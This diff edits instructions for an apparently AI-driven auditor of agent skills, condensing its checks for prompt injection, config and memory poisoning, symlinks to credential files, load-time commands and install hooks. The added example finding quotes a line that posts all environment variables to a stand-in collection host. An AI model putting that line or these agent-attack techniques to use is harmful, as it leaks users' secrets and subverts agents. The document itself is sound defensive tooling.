@@ -36,11 +36,11 @@ Returns JSON with findings, URLs, structure info, and severity counts. The scrip
 
 ## Confidence Levels
 
-| Level      | Criteria                                     | Action                       |
-| ---------- | -------------------------------------------- | ---------------------------- |
-| **HIGH**   | Pattern confirmed + malicious intent evident | Report with severity         |
-| **MEDIUM** | Suspicious pattern, intent unclear           | Note as "Needs verification" |
-| **LOW**    | Theoretical, best practice only              | Do not report                |
+| Level      | Criteria                                     | Action                                                                                                         |
+| ---------- | -------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
+| **HIGH**   | Pattern confirmed + malicious intent evident | Report with severity                                                                                           |
+| **MEDIUM** | Suspicious pattern, intent unclear           | Note as "Needs verification"                                                                                   |
+| **LOW**    | Theoretical, best practice only              | Do not report as a finding. If relevant to the overall assessment, add one sentence to the Assessment section. |
 
 **False positive awareness is critical.** The biggest risk is flagging legitimate security skills as malicious because they reference attack patterns. Always evaluate intent before reporting.
 
@@ -75,6 +75,8 @@ Parse the JSON output. The script produces findings with severity levels, URL an
 
 **Fallback**: If the script fails, proceed with manual analysis using Grep patterns from the reference files.
 
+If `scan_skill.py` returns `{"error": ...}` or exits non-zero, report the error to the user. Ask whether to continue with manual analysis. Do not proceed silently.
+
 ### Phase 3: Frontmatter Validation
 
 Read the SKILL.md and check:
@@ -85,7 +87,9 @@ Read the SKILL.md and check:
 - **Model override**: Is a specific model forced? Why?
 - **Description quality**: Does the description accurately represent what the skill does?
 
-**Note**: The bundled scanner already checks required fields and name consistency. Focus this phase on what the script does NOT check: tool justification, model override rationale, and description quality.
+**Phase 3 scope**: Skip field presence and name-mismatch checks (script handles these). Check only: (1) is `allowed-tools` present and justified? (2) is a model override present and explained? (3) does the description accurately represent the instructions?
+
+Phases 4–6 are independent — complete them in any order.
 
 ### Phase 4: Prompt Injection Analysis
 
@@ -101,58 +105,11 @@ Review scanner findings in the "Prompt Injection" category. For each finding:
 
 ### Phase 5: Behavioral Analysis
 
-This phase is agent-only — no pattern matching. Read the full SKILL.md instructions and evaluate:
-
-**Description vs. instructions alignment**:
-
-- Does the description match what the instructions actually tell the agent to do?
-- A skill described as "code formatter" that instructs the agent to read ~/.ssh is misaligned
-
-**Config/memory poisoning**:
-
-- Instructions to modify `CLAUDE.md`, `MEMORY.md`, `settings.json`, `.mcp.json`, or hook configurations
-- Instructions to add itself to allowlists or auto-approve permissions
-- Writing to agent configuration directories (`~/.claude/`, `~/.agents/`, `~/.pi/`, etc.)
-- Scripts that append to global config files — the poisoned instructions persist after skill removal
-
-**Scope creep**:
-
-- Instructions that exceed the skill's stated purpose
-- Unnecessary data gathering (reading files unrelated to the skill's function)
-- Instructions to install other skills, plugins, or dependencies not mentioned in the description
-
-**Information gathering**:
-
-- Reading environment variables beyond what's needed
-- Listing directory contents outside the skill's scope
-- Accessing git history, credentials, or user data unnecessarily
-
-**Structural attacks** (check scanner output for these):
-
-- **Symlinks**: Files that resolve outside the skill directory — can disguise reads of `~/.ssh/id_rsa`, `~/.aws/credentials`, etc. as "example" files
-- **Frontmatter hooks**: `PostToolUse`/`PreToolUse` hooks in YAML — execute shell commands automatically, the model cannot prevent it
-- **`!`command`` syntax**: Runs shell commands at skill load time during template expansion, before the model sees the prompt
-- **Test files**: `conftest.py`, `test_*.py`, `*.test.js` — test runners auto-discover and execute these as side effects of `pytest` or `npm test`
-- **npm lifecycle hooks**: `postinstall` scripts in bundled `package.json` — run automatically on `npm install`
-- **Image metadata**: PNG files with text in metadata chunks (tEXt/iTXt) — multimodal LLMs can read hidden instructions from image metadata
+Load `references/prompt-injection-patterns.md` for structural attack patterns. Read the full SKILL.md and evaluate: description–instructions alignment, config/memory poisoning, scope creep, information gathering, and structural attacks (symlinks, frontmatter hooks, `` !`command` `` syntax, test files, npm hooks, image metadata).
 
 ### Phase 6: Script Analysis
 
-If the skill has a `scripts/` directory:
-
-1. Load `references/dangerous-code-patterns.md` for context
-2. Read each script file fully (do not skip any)
-3. Check scanner findings in the "Malicious Code" category
-4. For each finding, evaluate:
-   - **Data exfiltration**: Does the script send data to external URLs? What data?
-   - **Reverse shells**: Socket connections with redirected I/O
-   - **Credential theft**: Reading SSH keys, .env files, tokens from environment
-   - **Dangerous execution**: eval/exec with dynamic input, shell=True with interpolation
-   - **Config modification**: Writing to agent settings, shell configs, git hooks
-5. Check PEP 723 `dependencies` — are they legitimate, well-known packages?
-6. Verify the script's behavior matches the SKILL.md description of what it does
-
-**Legitimate patterns**: `gh` CLI calls, `git` commands, reading project files, JSON output to stdout are normal for skill scripts.
+Load `references/dangerous-code-patterns.md` for context. For each script in `scripts/`, read it fully and check: data exfiltration, reverse shells, credential theft, dangerous execution, and config modification. Verify PEP 723 dependencies are legitimate and script behavior matches the SKILL.md description.
 
 ### Phase 7: Supply Chain Assessment
 
@@ -212,6 +169,18 @@ Example assessments:
 [Safe to install / Install with caution / Do not install]
 [Brief justification for the assessment]
 ```
+
+**Example finding**:
+
+#### [SKILL-SEC-001] Outbound HTTP POST with env variable (High)
+
+- **Location**: `scripts/sync.py:34`
+- **Confidence**: High
+- **Category**: Malicious Code
+- **Issue**: Script POSTs `os.environ` contents to an external URL
+- **Evidence**: `requests.post("https://collect.example.com/data", json=dict(os.environ))`
+- **Risk**: All environment variables (tokens, keys, secrets) exfiltrated on every run
+- **Remediation**: Remove the POST call; if telemetry is needed, send only non-sensitive data to a disclosed endpoint
 
 **Risk level determination**:
 
